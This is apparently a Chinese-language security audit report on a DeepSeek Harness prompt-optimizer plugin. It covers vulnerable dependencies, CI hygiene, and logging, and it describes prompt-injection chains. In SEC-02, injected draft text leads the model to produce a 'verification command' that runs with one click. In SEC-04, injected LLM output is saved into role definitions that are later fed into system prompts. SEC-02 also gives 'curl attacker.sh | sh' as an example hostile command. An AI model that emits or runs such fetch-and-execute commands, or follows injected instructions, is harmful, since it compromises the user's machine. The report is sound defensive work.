# 安全审计报告 — dsh-prompt-optimizer

- **审计日期**：2026-10-24
- **审计范围**：仓库全部源代码文件（4 个包的 `src/`、`tests/`、根级脚本 `scripts/`、构建工具 `tools/`、CI 工作流 `.github/workflows/`、各 `package.json` 与锁文件），外加全仓危险模式扫描（`eval` / `innerHTML` / 硬编码密钥 / `child_process` / Web Storage / `postMessage` / `process.env`）与 `pnpm audit` 依赖漏洞检查。
- **审计模式**：只读审计，未修改任何业务代码。
- **项目形态**：DeepSeek Harness (dsh) 插件族 —— Node 宿主服务（`packages/prompt-optimizer`）、Typert Remote 控制器（`packages/api-prompt-optimizer`）、React 浏览器 UI（`packages/client-ui-prompt-optimizer`）、profile bundle（`packages/bundle`）。运行环境为本地桌面单用户宿主，Remote 客户端为同机受信 UI。

## 执行摘要

代码整体安全质量较高：**无 XSS 注入面**（全部 React JSX 转义渲染，全仓无 `dangerouslySetInnerHTML`/`innerHTML`/`eval` 命中）、**无硬编码密钥或凭证**、**路径遍历防护到位**（role slug 双重校验）、CI 权限最小化且锁文件冻结。主要风险集中在三处：① 直接依赖 `zod` 被有意 pin 在含已知高危漏洞的 4.4.3 版本；② `verify` 命令核验链路接受 LLM 生成的任意 shell 命令字符串，缺少命令内容层防护（提示注入 → 一次点击即执行）；③ `undici` 传递依赖携带 3 条已知漏洞。共发现 **2 High、2 Medium、4 Low**。

---

## 高危（High）

### SEC-01 [HIGH] zod 直接依赖存在已知高危漏洞（内存耗尽 DoS）且被有意固定

- **位置**：
  - `packages/prompt-optimizer/package.json:39`（`"zod": "4.4.3"`）
  - `packages/api-prompt-optimizer/package.json:41`（`"zod": "4.4.3"`）
  - 固定原因记录于 `docs/compatibility.md:10`（"pinned — required by lib/types interop, do not upgrade"）与 `AGENTS.md`（Pinned dependencies 节）
- **规则/依据**：REACT-CONFIG-001 / JS-SUPPLY-001（依赖供应链）；`pnpm audit --prod` 直接命中发布包
- **证据**：GHSA-mrhx-c7xc-m3w5 — "Zod can exhaust memory while validating oversized constrained collections"，受影响版本 `<4.6.6`。本项目 zod 用于 `packages/api-prompt-optimizer/src/generated/typert.remote-client.ts:46-174` 的请求 codec，解析来自 Remote 客户端的 JSON 输入。
- **影响**：攻击者构造超大的受限集合输入可令验证进程内存耗尽（DoS）。当前攻击面有限（Remote 客户端为本机受信 UI，非公网 API），但依赖树携带高危漏洞进入两个发布 npm 包；一旦 Remote 暴露面扩大（远程/多用户场景）即成为直接 DoS 路径。
- **修复建议**：
  1. 在分支上尝试升级 `zod >= 4.6.6` 并运行 `pnpm run check`，验证 lib/types interop 是否真的不兼容（固定理由可能已随 4.5/4.6 版本消除）。
  2. 若升级受阻，通过 `pnpm.overrides` 强制解析到已修补版本做隔离验证，并向上游 harness 反馈推进 baseline。
  3. 短期缓解：在 codec 之前对输入 JSON 尺寸设置预检上限（拒绝超过阈值的请求体），缩小 DoS 窗口。
- **误报说明**：非误报——漏洞、版本、攻击路径均经 `pnpm audit` 与源码用法双重确认；实际可利用性受部署形态（本地单用户）限制。

### SEC-02 [HIGH] verify 命令核验链路缺少命令内容防护：LLM 生成的任意 shell 命令可被执行

- **位置**：
  - 宿主执行点：`packages/prompt-optimizer/src/index.ts:587-637`（`verify()`，命令在 `:611-616` 经 `shell.execute` 于 Session workspace 运行）
  - 命令来源：`packages/prompt-optimizer/src/meta-prompt.ts:448-462`（`parseAcceptanceLine` 从 LLM 响应的反引号段提取 `commandTemplate`）
  - UI 触发点：`packages/client-ui-prompt-optimizer/src/client/PreviewPanel.tsx:130-142`（`runCheck` → Remote verify）、`:297-302`（"运行核验"按钮）
- **规则/依据**：提示注入 → 任意命令执行链路（信任边界：LLM 输出被当作可执行内容）
- **证据**：宿主端仅校验命令长度（≤2000 字符，`index.ts:597-599`）与超时；**无命令白名单、无危险模式过滤、无二次审批**。命令模板完全由优化模型的输出决定，而模型输出可被 draft 文本中的提示注入操纵（例如用户粘贴的恶意网页/文件内容进入草稿 → 优化模型被诱导生成如 `curl attacker.sh | sh` 形式的"核验命令"）。UI 侧命令仅以普通文本呈现（`locales.ts`：`acceptanceMechanical: '{text}（命令核验：{command}）'`），无显著风险警示。
- **缓解因素**（已核实）：
  - 执行需用户点击"运行核验"按钮，且所有 `<placeholder>` 填写完整后才可点击（`PreviewPanel.tsx:270,298`）；
  - 执行经宿主 `dsh-shell` 组合服务，宿主侧存在沙箱实现（harness `packages/shell/pwsh-sandbox` 等），实际权限边界由宿主配置决定。
- **残余风险**：社会工程下的一次点击即可在工作区执行任意命令；当宿主沙箱为 workspace-write 级别时命令可写文件；插件自身不提供任何命令内容防护层，安全完全外包给宿主配置与用户警觉。
- **修复建议**：
  1. 宿主 `verify()` 增加命令安全层：优先只读命令白名单（`grep`/`test`/`node --test` 等）；至少对危险模式拒绝执行（网络外发、`| sh`/`| bash`、`rm`/写入重定向、命令链分隔符后接下载器等）。
  2. UI 运行前以显著样式（如警示色 + 等宽全文）展示将要执行的完整命令，高危模式时要求显式二次确认。
  3. 让 verify 复用宿主 agent 工具调用同款的审批/沙箱管道，而非直连 shell 执行器。
- **误报说明**：非误报。链路完整可达；利用前提（提示注入成功 + 用户点击）在报告中已如实标注。

---

## 中危（Medium）

### SEC-03 [MEDIUM] undici 传递依赖携带 3 条已知漏洞（1 high + 2 moderate）

- **位置**：依赖链 `packages/prompt-optimizer/package.json:49,64`（`@deepseek-ai/dsh-shell` peer/dev）→ `@deepseek-ai/dsh-subprocess` → `@deepseek-ai/dsh-http-proxy` → `undici >=8.0.0 <8.12.2`
- **规则/依据**：JS-SUPPLY-001 / REACT-SUPPLY-001（依赖供应链卫生）；`pnpm audit` 命中
- **证据**：
  - GHSA-4qv8-2p9j-2685（**high**）— DoS via unhandled error on excessive content-length
  - GHSA-f72v-6w45-q472（moderate）— Subresource Integrity bypass via non-lowercase algorithm tokens
  - 另一条 moderate — EventSource 无界内存 DoS
- **影响**：本地开发与 CI 环境安装即携带漏洞版本；发布包运行时该链由宿主提供（peerDependencies），宿主若解析到旧 undici 则继承漏洞。发布产物本身不打包这些依赖，故降为中危。
- **修复建议**：
  1. 本地仓库加 `pnpm.overrides` 将 `undici` 强制到 `>=8.12.2` 并跑 `pnpm run check` 验证无回归；
  2. 推动 harness baseline 升级（`docs/compatibility.md` 同步）；
  3. 在 CI 中加入 `pnpm audit --prod` 门禁，防止同类问题再次被固定。
- **误报说明**：非误报；影响等级按"传递依赖 + 宿主侧解析"折算。

### SEC-04 [MEDIUM] evolveRole 将 LLM 输出直接持久化进角色定义文件（存储型提示注入）

- **位置**：
  - 写入点：`packages/prompt-optimizer/src/index.ts:740-802`（`evolveRole()`，`:788-793` 将生成内容覆盖 `<slug>.md`）
  - 注入面：`packages/prompt-optimizer/src/meta-prompt.ts:166-175`（`roleBlock` 将角色定义**全文注入**此后每轮优化的 system prompt）
- **规则/依据**：不可信 LLM 输出 → 持久化 → 高权限上下文（system prompt）注入
- **证据**：生成定义仅校验"非空、`# ` 开头、≤8000 字符"（`index.ts:788-790`）后直接落盘；UI 侧 `PreviewPanel.tsx:171-186` 的 evolve 按钮触发后直接写文件，仅事后回显新角色名，**无内容审阅/确认环节**。draft 中的提示注入内容可借"改进此角色"持久化为角色定义，长期影响后续所有使用该角色的优化轮（角色定义又会被注入未来的 LLM 请求）。
- **缓解因素**：写入前自动备份 `<slug>.md.bak`（`index.ts:791-792`）；slug 经 `ROLE_ID_PATTERN` 正则 + 目录列举双重匹配（`index.ts:747-748`），路径逃逸防护到位；触发仍需用户点击。
- **修复建议**：
  1. UI 在写入前展示生成定义的 diff 或全文供用户审阅确认（当前为"点击即落盘"）；
  2. 宿主对生成内容做基本注入标记扫描（如指令劫持类语句），命中时拒绝写入或要求更强确认；
  3. 文档中明示该功能会修改磁盘上的角色定义文件。
- **误报说明**：功能设计即如此（角色进化），风险定级基于"LLM 输出直接获得持久化 + system prompt 注入位"的组合。

---

## 低危（Low）

### SEC-05 [LOW] `prompt-optimizer/llm-request` 事件将完整草稿与 system prompt 明文写入会话日志

- **位置**：`packages/prompt-optimizer/src/index.ts:454-466`（`session.append('prompt-optimizer/llm-request', {...})`）
- **描述**：每轮优化把完整 messages（含 draft 全文）、system prompt 持久化到会话事件日志。草稿可能包含凭据、内部代码等敏感内容，落盘暴露面随之扩大。设计定位为 log-only 审计记录。
- **影响**：本地单用户场景下风险低；会话日志被同步/分享/导出时敏感内容随之扩散。
- **修复建议**：在 README/文档中声明该行为；考虑提供截断/脱敏选项，或对超过阈值的 payload 只记录摘要。

### SEC-06 [LOW] `savePrompt.text` 与 `optimize.previousAttempts` 无大小上限

- **位置**：`packages/prompt-optimizer/src/index.ts:646-670`（`savePrompt` 仅对 title 限 120 字符，`text` 无上限）；`index.ts:506`（`previousAttempts` 数组无条数/总大小限制，全量拼入 LLM 输入 `meta-prompt.ts:398-409`）
- **描述**：可将超大文本写入本地存储域（存储膨胀/磁盘耗尽），或让重试轮的 LLM 输入无界增长（成本/内存放大）。
- **修复建议**：为 `text` 增加字节上限（对齐 `maxInputBytes` 量级）；为 `previousAttempts` 增加条数与总字节数上限。

### SEC-07 [LOW] CI GitHub Actions 未 pin 到 commit SHA

- **位置**：`.github/workflows/ci.yml:24,27,29`、`.github/workflows/release.yml:17,19,21`（`actions/checkout@v4`、`pnpm/action-setup@v4`、`actions/setup-node@v4` 均为 tag 引用）
- **描述**：tag 引用可被仓库方移动，构成供应链攻击面（参照 2025 年 tj-actions/changed-files 事件）。
- **缓解因素**（已核实）：两个工作流均已设置 `permissions: contents: read` 最小权限；安装使用 `--frozen-lockfile`；harness 克隆固定 tag `dsh-v0.2.1-rc.2`。
- **修复建议**：将三个 action 引用 pin 到完整 commit SHA；可加 Dependabot 自动维护 SHA 更新。

### SEC-08 [LOW] verify 命令输出全量回显并持久化

- **位置**：`packages/prompt-optimizer/src/index.ts:625-635`（stdout+stderr 截断 4000 字符后存入 `prompt-optimizer/verify` 事件并在 UI 回显，`PreviewPanel.tsx:312-314`）
- **描述**：命令输出可能包含环境变量、token、文件内容等敏感信息，展示于 UI 并写入会话日志。
- **修复建议**：考虑对输出做常见密钥模式脱敏，或仅本地展示不落日志。

---

## 正面发现（无需整改）

| 检查项 | 结论 |
| --- | --- |
| XSS / DOM XSS | **通过**：全部 React JSX 转义渲染；全仓无 `dangerouslySetInnerHTML`、`innerHTML`、`document.write`、`eval`、`new Function` 命中（含 UI 与 host 两端） |
| 硬编码密钥/凭证 | **通过**：git 跟踪的 241 个文件全文扫描无命中（API key / private key / token / Bearer 等模式）；`.env` 类文件未被跟踪；`.tmp/` 本地开发脚本亦无密钥 |
| 路径遍历 | **通过**：role slug 经 `^[a-z0-9][a-z0-9-]*$` 正则校验 + 必须命中目录列举条目的双重匹配（`index.ts:746-751, 946-956`），请求值无法逃出 rolesDir |
| Web Storage / postMessage 滥用 | **通过**：客户端代码零使用 |
| 敏感环境变量泄漏 | **通过**：`process.env` 仅用于 `NODE_ENV`（构建常量内联）与 `DSH_HARNESS_ROOT`（测试路径，`vitest.config.ts:56-58`） |
| CSRF / 重定向 | **不适用**：非 cookie 会话模型，无导航/redirect 处理 |
| CI 最小权限与锁文件 | **通过**：`permissions: contents: read`、`--frozen-lockfile`、克隆固定 tag、NPM_TOKEN 仅经 secrets 注入 |
| 错误信息泄漏 | **通过**：`RemoteError` 只携带 message，不暴露堆栈/内部路径 |

## 修复优先级建议

1. **立即**：SEC-01（zod 升级验证）与 SEC-02（verify 命令白名单/确认层）——两者共同覆盖当前最高风险面。
2. **近期**：SEC-03（undici override + audit 门禁）、SEC-04（evolveRole 写前审阅）。
3. **随版本迭代**：SEC-05 ~ SEC-08。
